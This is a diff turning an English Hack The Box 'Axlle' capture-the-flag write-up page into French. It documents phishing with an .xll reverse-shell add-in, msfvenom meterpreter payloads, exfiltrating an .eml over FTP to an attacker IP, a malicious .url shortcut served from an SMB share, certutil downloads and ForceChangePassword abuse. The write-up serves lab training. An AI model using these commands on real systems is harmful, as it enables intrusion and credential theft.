@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
     <head>
         <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a .xll attachment to gain an initial foothold. On the compromised target, we discover an .eml file containing details about an automated task. By leveraging this information, we craft a malicious .url file, enabling lateral movement to another user account and accessing the user flag." />
+<meta name="description" content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe .xll pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier .eml contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier ." />
 <meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://scorpiosec.com/posts/2024/11/htb-axlle/" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/11/htb-axlle/" />
 
 
     <title>
@@ -37,20 +37,20 @@
 
 
 <meta itemprop="name" content="HTB: Axlle">
-<meta itemprop="description" content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a .xll attachment to gain an initial foothold. On the compromised target, we discover an .eml file containing details about an automated task. By leveraging this information, we craft a malicious .url file, enabling lateral movement to another user account and accessing the user flag."><meta itemprop="datePublished" content="2024-11-15T17:00:51-06:00" />
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe .xll pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier .eml contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier ."><meta itemprop="datePublished" content="2024-11-15T17:00:51-06:00" />
 <meta itemprop="dateModified" content="2024-11-15T17:00:51-06:00" />
-<meta itemprop="wordCount" content="1618"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png" />
+<meta itemprop="wordCount" content="1714"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png" /><meta name="twitter:title" content="HTB: Axlle"/>
-<meta name="twitter:description" content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a .xll attachment to gain an initial foothold. On the compromised target, we discover an .eml file containing details about an automated task. By leveraging this information, we craft a malicious .url file, enabling lateral movement to another user account and accessing the user flag."/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe .xll pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier .eml contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier ."/>
 
 
 
     <meta property="og:title" content="HTB: Axlle" />
-<meta property="og:description" content="Platform: Hack The Box Link: Axlle Level: Hard OS: Windows Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a .xll attachment to gain an initial foothold. On the compromised target, we discover an .eml file containing details about an automated task. By leveraging this information, we craft a malicious .url file, enabling lateral movement to another user account and accessing the user flag." />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Axlle Niveau: Difficile OS: Windows Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe .xll pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier .eml contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier ." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://scorpiosec.com/posts/2024/11/htb-axlle/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/11/htb-axlle/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Axlle/Axlle.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-11-15T17:00:51-06:00" />
 <meta property="article:modified_time" content="2024-11-15T17:00:51-06:00" />
 
@@ -115,14 +115,14 @@ if (!doNotTrack) {
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
         <div class="submenu">
             <li class="dropdown">
-                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
                 <div class="dropdown-content">
                     
                         
-                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/11/htb-axlle/">fr</a>
+                            <a title="en" href="https://scorpiosec.com/posts/2024/11/htb-axlle/">en</a>
                         
                     
                 </div>
@@ -158,11 +158,11 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        8 minutes
+        9 minutes
 
-         | Also available in
+         | Aussi disponible en
           
-              <a href="https://scorpiosec.com/fr/posts/2024/11/htb-axlle/"><span class="flag fi fi-fr"></span></a>
+              <a href="https://scorpiosec.com/posts/2024/11/htb-axlle/"><span class="flag fi fi-gb"></span></a>
           
         
       </p>
@@ -170,7 +170,7 @@ if (!doNotTrack) {
 
     <article>
       <h1 class="post-title">
-        <a href="https://scorpiosec.com/posts/2024/11/htb-axlle/">HTB: Axlle</a>
+        <a href="https://scorpiosec.com/fr/posts/2024/11/htb-axlle/">HTB: Axlle</a>
       </h1>
 
       
@@ -178,20 +178,20 @@ if (!doNotTrack) {
       
         <hr />
         <aside id="toc">
-          <div class="toc-title">Table of Contents</div>
+          <div class="toc-title">Table des matières</div>
           <nav id="TableOfContents">
   <ul>
-    <li><a href="#scanning">Scanning</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#initial-foothold">Initial Foothold</a>
+    <li><a href="#balayage">Balayage</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#accès-initial">Accès initial</a>
       <ul>
-        <li><a href="#rabbit-hole-database-exploitation">Rabbit Hole (Database exploitation)</a></li>
-        <li><a href="#url-file-exploitation-shell-as-dallonmatrix">.URL file exploitation (shell as dallon.matrix)</a></li>
-        <li><a href="#lateral-movement-shell-as-bazhumphries">Lateral Movement (shell as baz.humphries)</a></li>
+        <li><a href="#impasse-exploitation-de-la-base-de-données">Impasse (exploitation de la base de données)</a></li>
+        <li><a href="#exploitation-du-fichier-url-shell-en-tant-que-dallonmatrix">Exploitation du fichier .URL (shell en tant que dallon.matrix)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-bazhumphries">Mouvement latéral (shell en tant que baz.humphries)</a></li>
       </ul>
     </li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
-    <li><a href="#beyond-root">Beyond Root</a></li>
+    <li><a href="#elévation-de-privilèges">Elévation de Privilèges</a></li>
+    <li><a href="#persistance">Persistance</a></li>
   </ul>
 </nav>
         </aside>
@@ -201,19 +201,19 @@ if (!doNotTrack) {
 
       <div class="post-content">
         <ul>
-<li>Platform: Hack The Box</li>
-<li>Link: <a href="https://app.hackthebox.com/machines/Axlle" target="_blank" >Axlle</a>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Axlle" target="_blank" >Axlle</a>
 
 </li>
-<li>Level: Hard</li>
+<li>Niveau: Difficile</li>
 <li>OS: Windows</li>
 </ul>
 <hr>
-<p>Axlle is a domain controller hosting a web server and an email server alongside standard Active Directory services. After conducting reconnaissance, we launch a phishing attack using a <code>.xll</code> attachment to gain an initial foothold. On the compromised target, we discover an <code>.eml</code> file containing details about an automated task. By leveraging this information, we craft a malicious <code>.url</code> file, enabling lateral movement to another user account and accessing the user flag. Using BloodHound, we identify the ability to force password changes on specific accounts. Exploiting this privilege, we perform another lateral movement. Finally, privilege escalation is achieved through command injection via a Windows utility.</p>
+<p>Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe <code>.xll</code> pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier <code>.eml</code> contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier <code>.url</code> malveillant, permettant un mouvement latéral vers un autre utilisateur et l&rsquo;accès au drapeau utilisateur. Avec BloodHound, nous identifions la possibilité de forcer des changements de mot de passe sur des comptes spécifiques. Grâce à ce privilège, nous effectuons un autre déplacement latéral. Enfin, l&rsquo;escalade des privilèges est réalisée par une injection de commandes via un binaire Windows.</p>
 <p>Target IP address - <code>10.10.11.21</code></p>
-<h2 id="scanning">Scanning</h2>
+<h2 id="balayage">Balayage</h2>
 <pre tabindex="0"><code>./nmap_scan.sh 10.10.11.21 Axlle
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,61050,61051,61052,61056,61058,61071
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-15 17:09 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.21
@@ -263,29 +263,29 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.31 seconds
-</span></span></code></pre></div><p>Our target is a domain controller, on top of the usual AD services it features:</p>
+</span></span></code></pre></div><p>Notre cible est un contrôleur de domaine, en plus des services AD habituels, il dispose des éléments suivants:</p>
 <ul>
-<li>A SMTP server on port 25 with hMailServer</li>
-<li>A web server on port 80 with Microsoft IIS</li>
-<li>The domain name is <code>axlle.htb</code> which we add to the <code>/etc/hosts</code> file.</li>
+<li>un serveur SMTP sur le port 25 avec hMailServer.</li>
+<li>Un serveur web sur le port 80 avec Microsoft IIS.</li>
+<li>Le nom de domaine est <code>axlle.htb</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</li>
 </ul>
-<h2 id="enumeration">Enumeration</h2>
-<p>At <code>http://axlle.htb/</code> we find a software development company website. It is under maintenance but we do get an email address for contact.</p>
+<h2 id="enumération">Enumération</h2>
+<p>À l&rsquo;adresse <code>http://axlle.htb/</code>, nous trouvons le site web d&rsquo;une société de développement de logiciels. Il est en cours de maintenance, mais nous obtenons une adresse e-mail pour les contacts.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/axlle_website.png" alt="Axlle website"></p>
-<p>Besides the information we gained earlier nothing stands out on the website, we try some directory bruteforcing but nothing valuable is found.</p>
+<p>Outre les informations que nous avons obtenues précédemment, rien de particulier pour ce site web. Nous essayons de forcer les répertoires, mais nous ne trouvons rien d&rsquo;intéressant.</p>
 <pre tabindex="0"><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://axlle.htb/ 
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/gobuster_axlle.png" alt="directory brute forcing attempt"></p>
-<p>Our subdomain enumeration attempt is equally unhelpful.</p>
+<p>Notre tentative d&rsquo;énumération des sous-domaines est tout aussi infructueuse.</p>
 <pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://axlle.htb -H &#34;Host: FUZZ.axlle.htb&#34; -ic -fs 10228
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/ffuf_axlle.png" alt="subdomain enumeration attempt"></p>
-<h2 id="initial-foothold">Initial Foothold</h2>
-<p>Previously we learned that the attachments we send to <code>accounts@axlle.htb</code> have to be in excel format, but we cannot make use of macros since they are disabled. Another way to create phishing emails is by using <code>xll</code> files.</p>
+<h2 id="accès-initial">Accès initial</h2>
+<p>Nous avons appris précédemment que les pièces jointes que nous envoyons à <code>accounts@axlle.htb</code> doivent être en format excel, mais nous ne pouvons pas utiliser les macros puisqu&rsquo;elles sont désactivées. Une autre façon de créer des e-mails de phishing est d&rsquo;utiliser des fichiers <code>xll</code>.</p>
 <blockquote>
-<p><code>.xll</code> files are Excel Add-In files used to extend the functionality of Microsoft Excel.</p>
+<p>Les fichiers <code>.xll</code> sont des fichiers Excel Add-In utilisés pour étendre les fonctionnalités de Microsoft Excel.</p>
 </blockquote>
-<p>On <a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec" target="_blank" >this website</a>
+<p>Sur <a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec" target="_blank" >ce site</a>
 
- we find an exploit called <code>XLL - EXEC</code> which we can use to gain a reverse shell by sending an email with a <code>.xll</code> attachmnent. The first step is to add a reverse shell to the exploit.</p>
+ nous trouvons un exploit appelé <code>XLL - EXEC</code> que nous pouvons utiliser pour obtenir un reverse shell en envoyant un email avec une pièce jointe <code>.xll</code>. La première étape consiste à ajouter un reverse shell à l&rsquo;exploit.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">__declspec</span>(dllexport) <span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">xlAutoOpen</span>(<span style="color:#66d9ef">void</span>);
@@ -307,64 +307,64 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Then we compile the C program into a shared library.</p>
+</span></span></code></pre></div><p>Nous compilons ensuite le programme C dans une bibliothèque partagée.</p>
 <pre tabindex="0"><code>x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll phishing.c -luser32
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/xll_compilation.png" alt="xll compilation"></p>
-<p>Finally we send the email with <a href="https://github.com/jetmore/swaks" target="_blank" >swaks</a>
+<p>Enfin, nous envoyons l&rsquo;e-mail avec <a href="https://github.com/jetmore/swaks" target="_blank" >swaks</a>
 
 .</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/phishing_email.png" alt="phishing email sent"></p>
 <pre tabindex="0"><code>swaks --to accounts@axlle.htb --from kscorpio@axlle.htb --header &#34;Subject: Open the doors&#34; --body &#34;Nothing to see here...&#34; --attach @shell.xll
-</code></pre><p>After a couple of minutes we get a shell as <code>gideon.hamill</code>.</p>
+</code></pre><p>Après quelques minutes, nous obtenons un shell sous le nom de <code>gideon.hamill</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/foothold.png" alt="shell as gideon.hamill"></p>
-<h3 id="rabbit-hole-database-exploitation">Rabbit Hole (Database exploitation)</h3>
-<p>This account does not have anything interesting in the common directories such as <code>Desktop</code>, <code>Documents</code>, and <code>Downloads</code>; we probably need to look elsewhere. From experience we know that <code>hMailServer</code> usually has some hard coded password in its <code>INI</code> file. We access it at <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code> and discover the administrator password and the database password.</p>
+<h3 id="impasse-exploitation-de-la-base-de-données">Impasse (exploitation de la base de données)</h3>
+<p>Ce compte n&rsquo;a rien d&rsquo;intéressant dans les répertoires communs tels que <code>Desktop</code>, <code>Documents</code>, et <code>Downloads</code>; nous devons probablement chercher ailleurs. Par expérience, nous savons que <code>hMailServer</code> a généralement un mot de passe dans son fichier <code>INI</code>. Nous y accédons à <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code> et découvrons le mot de passe de l&rsquo;administrateur et le mot de passe de la base de données.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/hmailserver_pwds.png" alt="hMailServer passwords found"></p>
-<p>We are unable to crack the first hash, but if we manage to recover the database password we might be able to recover some users passwords. We can use <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter" target="_blank" >this decrypter</a>
+<p>Nous ne parvenons pas à déchiffrer le premier hachage, mais si nous réussissons à récupérer le mot de passe de la base de données, nous pourrons peut-être récupérer les mots de passe de certains utilisateurs. Nous utilisons <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter" target="_blank" >ce décrypteur</a>
 
- to find the database password, <code>4A02D41C55AC</code>.</p>
+ pour trouver le mot de passe de la base de données, <code>4A02D41C55AC</code></p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/database_pwd.png" alt="database password"></p>
-<p>Since the database type is <code>MSSQLCE</code>, we can download the <code>.sdf</code> file on our local machine (I used the <code>download</code> command in a meterpreter shell). The <code>.sdf</code> file is in <code>C:\Program Files (x86)\hMailServer\Database</code>.</p>
+<p>Puisque le type de base de données est <code>MSSQLCE</code>, nous pouvons télécharger le fichier <code>.sdf</code> sur notre machine locale (j&rsquo;ai utilisé la commande <code>download</code> dans un shell meterpreter). Le fichier <code>.sdf</code> se trouve dans <code>C:\Program Files (x86)\hMailServer\Database</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/sdf_file_location.png" alt="sdf file location"></p>
 <blockquote>
-<p>An <code>.sdf</code> file (SQL Server Compact Database File) is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).</p>
+<p>Un fichier <code>.sdf</code> (SQL Server Compact Database File) est un format de base de données utilisé par Microsoft SQL Server Compact Edition (SQL CE).</p>
 </blockquote>
-<p>Go on <a href="https://www.rebasedata.com" target="_blank" >rebasedata</a>
+<p>Allez sur <a href="https://www.rebasedata.com" target="_blank" >rebasedata</a>
 
- and convert your <code>.sdf</code> file to a <code>sqlite</code> format.</p>
+ et convertissez votre fichier <code>.sdf</code> en format <code>sqlite</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/sdf_file_conversion.png" alt="sdf file conversion"></p>
-<p>After the conversion is completed, download the <code>result.zip</code> file. Extract it and you will get a file called <code>data.sqlite</code>. Run the following queries and you will find a hash for <code>accounts@axlle.htb</code>.</p>
+<p>Une fois la conversion terminée, téléchargez le fichier <code>result.zip</code>. Extrayez-le et vous obtiendrez un fichier appelé <code>data.sqlite</code>. Exécutez les requêtes suivantes et vous trouverez un hash pour <code>accounts@axlle.htb</code>.</p>
 <pre tabindex="0"><code>sqlite3 data.sqlite
 .tables
 SELECT * FROM hm_accounts;
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/db_hashes.png" alt="database password hash found"></p>
-<p>Unfortunately we are unable to also crack this hash, let&rsquo;s assume this was a rabbit hole and look for another exploitation path.</p>
+<p>Malheureusement, nous ne sommes pas en mesure de craquer ce hachage, il n&rsquo;y a rien de plus à faire pour ce processus d&rsquo;exploitation, alors cherchons une autre voie.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/hmailserver_hashcrack_fail.png" alt="hmailserver hash cracking failure"></p>
-<h3 id="url-file-exploitation-shell-as-dallonmatrix">.URL file exploitation (shell as dallon.matrix)</h3>
-<p>In <code>C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F</code> we find an <code>.eml</code> file.</p>
+<h3 id="exploitation-du-fichier-url-shell-en-tant-que-dallonmatrix">Exploitation du fichier .URL (shell en tant que dallon.matrix)</h3>
+<p>Dans <code>C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F</code> nous trouvons un fichier <code>.eml</code>.</p>
 <blockquote>
-<p>An <code>.eml</code> file is an email message saved in the MIME RFC 822 standard format. These files are typically created by email programs such as Microsoft Outlook, Mozilla Thunderbird, and others. The <code>.eml</code> file format preserves the original email header, body, and any attachments, making it useful for archiving and transferring email messages.</p>
+<p>Un fichier <code>.eml</code> est un message électronique enregistré au format standard MIME RFC 822. Ces fichiers sont généralement créés par des programmes de messagerie tels que Microsoft Outlook, Mozilla Thunderbird, etc. Le format de fichier <code>.eml</code> préserve l&rsquo;en-tête, le corps et les pièces jointes du message original, ce qui le rend utile pour l&rsquo;archivage et le transfert des messages électroniques.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/eml_file.png" alt="eml file location"></p>
-<p>We send it to our local machine via FTP (it can also be done with the <code>download</code> command in meterpreter used earlier).</p>
+<p>Nous l&rsquo;envoyons à notre machine locale par FTP (cela peut aussi être fait avec la commande <code>download</code> de meterpreter utilisée plus tôt).</p>
 <pre tabindex="0"><code>pip3 install pyftpdlib
 python3 -m pyftpdlib --port 21 --write
-</code></pre><p>On the target run the command below and you will receive the eml file on the FTP server:</p>
+</code></pre><p>Sur la cible, nous exécutons la commande ci-dessous et recevons le fichier eml sur le serveur FTP:</p>
 <pre tabindex="0"><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;, &#39;C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&#39;)
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/eml_file_dl.png" alt="eml file download"></p>
-<p>We learn that we can drop some URLs in the <code>C:\inetpub\testing</code> folder, and they will be automatically executed.</p>
+<p>Nous apprenons que nous pouvons placer des liens dans le dossier <code>C:\inetpub\testing</code>, et que ces derniers seront automatiquement exécutés.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/webdev-team-email.png" alt="content of eml file"></p>
-<p>We can upload a <code>.url</code> file that points to a malicious file into the <code>testing</code> folder.</p>
+<p>Nous pouvons transférer un fichier <code>.url</code> qui pointe vers un fichier malveillant dans le dossier <code>testing</code>.</p>
 <blockquote>
-<p><code>.url</code> files are commonly known as internet shortcuts. They are used to create shortcuts to websites or web resources, allowing users to quickly access them without having to navigate through a web browser.</p>
+<p>Les fichiers <code>.url</code> sont communément appelés raccourcis internet. Ils sont utilisés pour créer des raccourcis vers des sites web ou des ressources web, permettant aux utilisateurs d&rsquo;y accéder rapidement sans avoir à naviguer dans un navigateur web.</p>
 </blockquote>
 <ol>
-<li>Create an <code>.exe</code> file with msfvenom.</li>
+<li>Créer un fichier <code>.exe</code> avec msfvenom.</li>
 </ol>
 <pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/malicious_exe.png" alt="malicious exe file"></p>
 <ol start="2">
-<li>Set up the listener in Metasploit.</li>
+<li>Configurer le listener dans Metasploit.</li>
 </ol>
 <pre tabindex="0"><code>use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -372,87 +372,87 @@ set lhost YOUR_IP
 set lport PORT_NUMBER
 run
 </code></pre><ol start="3">
-<li>Create the <code>.url</code> file with the following content.</li>
+<li>Créer le fichier <code>.url</code> avec le contenu suivant.</li>
 </ol>
 <pre tabindex="0"><code>[InternetShortcut]
 URL=file://YOUR_IP/share/payload.exe
 </code></pre><ol start="4">
-<li>Start a SMB server and a web server.</li>
+<li>Lancer un serveur SMB et un serveur web.</li>
 </ol>
 <pre tabindex="0"><code>impacket-smbserver -smb2support share .
 
 python3 -m http.server
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/smb-server.png" alt="smb server"></p>
 <ol start="5">
-<li>Place the .url file in the testing folder.</li>
+<li>Placer le fichier .url dans le dossier de test.</li>
 </ol>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/evil.url evil.url
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/evil_url_download.png" alt="evil url file download"></p>
-<p>After a few seconds we get a meterpreter shell as <code>dallon.matrix</code>.</p>
+<p>Après quelques secondes, nous obtenons un shell meterpreter en tant que <code>dallon.matrix</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/dallon_shell.png" alt="dallon.matrix shell"></p>
-<p>Note that we also get the password hash of <code>dallon.matrix</code> on the SMB server.</p>
+<p>Nous obtenons également le hachage du mot de passe de <code>dallon.matrix</code> sur le serveur SMB.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/dallon_pwd_hash.png" alt="dallon.matrix password hash"></p>
-<p>But we are unable to crack it.</p>
+<p>Mais nous ne parvenons pas à le craquer.</p>
 <pre tabindex="0"><code>hashcat -a 0 -m 5600 dallon_hash.txt /usr/share/wordlists/rockyou.txt
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/dallon_hashcrack_fail.png" alt="dallon.matrix password hash crack failure"></p>
-<p>On the Desktop, we find the user flag.</p>
+<p>Sur le bureau, nous trouvons le drapeau utilisateur.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/user_flag.png" alt="user flag"></p>
-<h3 id="lateral-movement-shell-as-bazhumphries">Lateral Movement (shell as baz.humphries)</h3>
-<p>For the Active Directory enumeration we will use <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe" target="_blank" >SharpHound.exe</a>
+<h3 id="mouvement-latéral-shell-en-tant-que-bazhumphries">Mouvement latéral (shell en tant que baz.humphries)</h3>
+<p>Pour l&rsquo;énumération de l&rsquo;Active Directory, nous utiliserons <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe" target="_blank" >SharpHound.exe</a>
 
 .</p>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
-</code></pre><p>After executing it, download the <code>zip</code> file.</p>
+</code></pre><p>Après l&rsquo;avoir exécuté, téléchargez le fichier <code>zip</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/sharphound_zip_file.png" alt="sharphound zip file"></p>
-<p>Unzip it and load the files into Bloodhound.</p>
-<p>Find <code>dallon.matrix</code> and you will see that he is a member of the <code>Web Devs</code> group.</p>
+<p>Décompressez-le et importez les fichiers dans Bloodhound.</p>
+<p>Trouvez <code>dallon.matrix</code> et vous verrez qu&rsquo;il est membre du groupe <code>Web Devs</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/web_devs_group.png" alt="web devs group"></p>
-<p>The members of the <code>Web Devs</code> group can change the password of <code>Baz.Humphries</code> and <code>Jacob.Greeny</code> because of <code>ForceChangePassword</code> which we can abuse with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" >PowerView</a>
+<p>Les membres du groupe <code>Web Devs</code> peuvent changer le mot de passe de <code>Baz.Humphries</code> et <code>Jacob.Greeny</code> à cause de <code>ForceChangePassword</code> dont nous pouvons abuser avec <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" >PowerView</a>
 
 .</p>
 <blockquote>
-<p>This account attribute allows the enforcement of a password change even without knowing the user&rsquo;s current password. <em>Read more about it <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword" target="_blank" >here</a>
+<p>Cet attribut de compte permet d&rsquo;appliquer un changement de mot de passe même sans connaître le mot de passe actuel de l&rsquo;utilisateur. <em>Pour en savoir plus, cliquez <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword" target="_blank" >ici</a>
 
 .</em></p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/ForeceChangePassword.png" alt="ForceChangePassword"></p>
-<p>Import PowerView on the target.</p>
+<p>Nous importons PowerView sur la cible.</p>
